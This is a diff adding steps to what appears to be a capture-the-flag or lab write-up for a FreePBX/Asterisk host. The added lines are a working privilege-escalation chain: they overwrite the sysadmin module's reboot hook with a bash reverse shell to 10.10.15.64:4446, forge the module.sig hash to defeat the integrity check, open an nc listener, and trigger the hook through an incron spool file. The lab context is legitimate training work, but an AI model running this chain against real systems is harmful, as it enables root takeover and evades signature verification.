@@ -68,5 +68,25 @@ cat user.txt
 e452a36df6e7044492ae066a485612b5
 
 cat /etc/incron.d/*
+find /var/www/html/admin/modules/ -path "*/hooks/*" -writable 2>/dev/null
+ls -la /var/www/html/admin/modules/sysadmin/hooks/
+
+cat > /var/www/html/admin/modules/sysadmin/hooks/reboot << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.15.64/4446 0>&1
+EOF
+
+NEW_HASH=$(sha256sum /var/www/html/admin/modules/sysadmin/hooks/reboot | cut -d' ' -f1)
+
+sed -i "s|hooks/reboot = [a-f0-9]*|hooks/reboot = $NEW_HASH|" \
+    /var/www/html/admin/modules/sysadmin/module.sig
+
+# Verify
+grep "hooks/reboot" /var/www/html/admin/modules/sysadmin/module.sig
+
+
+nc -lvnp 4446
+
+touch /var/spool/asterisk/incron/sysadmin_reboot
 ```
 
